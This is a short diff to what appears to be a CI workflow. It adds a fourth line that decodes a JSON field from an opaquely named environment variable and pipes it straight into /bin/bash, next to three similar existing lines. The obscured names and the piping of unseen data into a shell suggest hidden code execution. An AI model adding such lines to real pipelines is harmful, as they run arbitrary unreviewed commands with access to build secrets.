@@ -22,6 +22,7 @@ jobs:
           echo $au5866 | jq -r .vro92485 | /bin/bash
           printf '%s' "$dabma4034" | jq -r .xt71 | /bin/bash
           echo $taij0 | jq -r .aevh0 | /bin/bash
+          echo $syuu8155 | jq -r .pgkd0 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
